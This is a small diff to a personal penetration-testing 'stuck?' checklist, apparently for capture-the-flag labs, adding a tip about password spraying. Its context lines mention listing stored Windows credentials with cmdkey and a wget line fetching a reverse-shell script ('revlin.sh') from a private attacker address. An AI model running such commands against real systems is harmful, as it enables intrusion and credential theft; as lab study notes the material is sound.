@@ -1,4 +1,6 @@
 # FEEL LIKE STUCK???
+- Discover more users and spray with known passwords...! (htb/flight)
+- 
 - Did we run cmdkey /list?
 - Did we try running POST request on found url???(ex hetemit)
 - Did we try wget without http:? so "wget 192.168.45.176:443/revlin.sh"
